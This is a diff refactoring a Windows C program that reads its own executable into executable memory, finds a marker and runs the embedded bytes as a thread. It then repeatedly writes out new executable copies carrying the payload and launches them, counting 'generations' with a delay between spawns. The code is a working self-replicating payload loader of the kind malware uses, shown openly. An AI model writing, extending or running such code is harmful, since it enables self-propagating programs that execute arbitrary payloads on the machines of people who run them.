@@ -16,7 +16,6 @@ int myEXESize = 0;
 int myStaticLength = 0;
 int myPayloadLength = 0;
 UINT8* myFileBuffer = 0;
-UINT8* executeableMem = 0;
 UINT8* nextPayloadBuf = 0;
 int MuPos = 0;
 int MuWatchDog = 0;
@@ -39,8 +38,7 @@ int main(int argc, char** argv)
     fseek(fp, 0, SEEK_SET);
     myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     fread(myFileBuffer, 1, myEXESize, fp);
-    fclose(fp);
-    fp = NULL;
+    fclose(fp); fp = NULL;
     for (int i = 0; i < myEXESize - 3; i++)
         if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
         {
@@ -49,9 +47,8 @@ int main(int argc, char** argv)
             
             nextPayloadBuf = myFileBuffer + i;
             NextPayloadSize = myEXESize - i;
-            
-            executeableMem = nextPayloadBuf + 1;
-            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(executeableMem), 0, 0, 0);
+
+            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(nextPayloadBuf + 1), 0, 0, 0);
             break;
         }
     if (myStaticLength == 0) // This is the first gen
@@ -93,10 +90,8 @@ int main(int argc, char** argv)
         }
         fwrite(myFileBuffer, 1, myStaticLength, fp);
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
-        
-        Sleep(GapTime); // Order is important here to avoid producing so fast
-        fclose(fp);
-        fp = NULL;
+        Sleep(GapTime); // Delay is important here to avoid producing so fast
+        fclose(fp); fp = NULL; // Unlock the file
         ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
     }
 }
